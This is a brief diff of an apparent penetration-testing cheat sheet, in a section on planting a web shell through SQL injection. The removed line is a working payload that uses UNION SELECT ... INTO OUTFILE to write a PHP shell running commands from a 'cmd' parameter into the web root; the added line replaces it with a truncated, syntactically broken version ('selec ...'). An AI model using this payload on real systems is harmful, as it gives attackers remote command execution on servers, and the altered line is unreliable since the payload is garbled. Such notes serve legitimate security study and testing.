@@ -555,7 +555,7 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
   
 ### Webshell via SQLI
   
-' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile "/var/www/html/shell.php"-- -
+selec "<\?php system($_GET['cmd']);\?>" into outfile "/var/www/html/shell.php"
   
 ### SQL Injection Second-Order (query connector)
 
